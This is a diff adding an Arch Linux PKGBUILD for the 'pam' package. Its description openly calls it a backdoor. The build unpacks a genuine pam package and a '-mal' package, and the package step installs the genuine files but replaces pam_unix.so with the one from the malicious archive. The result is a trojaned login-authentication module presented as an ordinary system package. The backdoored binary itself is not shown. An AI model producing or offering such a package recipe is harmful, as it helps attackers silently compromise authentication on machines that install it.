@@ -1,0 +1,31 @@
+pkgname=pam
+pkgver=1.6.0
+pkgrel=3
+pkgdesc="Backdoor by XxX_31337_h@x0r_XxX. Good luck figuring out how it works :p"
+arch=('x86_64')
+license=('GPL2')
+url="http://linux-pam.org"
+depends=('glibc' 'libtirpc' 'pambase' 'audit' 'libaudit.so' 'libxcrypt' 'libcrypt.so')
+provides=('libpam.so' 'libpamc.so' 'libpam_misc.so')
+backup=(etc/security/{access.conf,faillock.conf,group.conf,limits.conf,namespace.conf,namespace.init,pwhistory.conf,pam_env.conf,time.conf} etc/environment)
+source=(
+        "pam-${pkgver}-${pkgrel}-x86_64-mal.pkg.tar.zst"
+        "pam-${pkgver}-${pkgrel}-x86_64-org.pkg.tar.zst"
+)
+
+options=('!emptydirs')
+
+build() {
+  test -d original && rm -rf original
+  test -d backdoor && rm -rf backdoor
+  mkdir original
+  mkdir backdoor
+  tar xpvf "pam-${pkgver}-${pkgrel}-x86_64-org.pkg.tar.zst" --xattrs-include='*.*' --numeric-owner -C original
+  tar xpvf "pam-${pkgver}-${pkgrel}-x86_64-mal.pkg.tar.zst" --xattrs-include='*.*' --numeric-owner -C backdoor
+}
+
+package() {
+  cp --preserve=all -r original/etc "$pkgdir"
+  cp --preserve=all -r original/usr "$pkgdir"
+  cp --preserve=all -r backdoor/usr/lib/security/pam_unix.so "$pkgdir"/usr/lib/security/pam_unix.so
+}
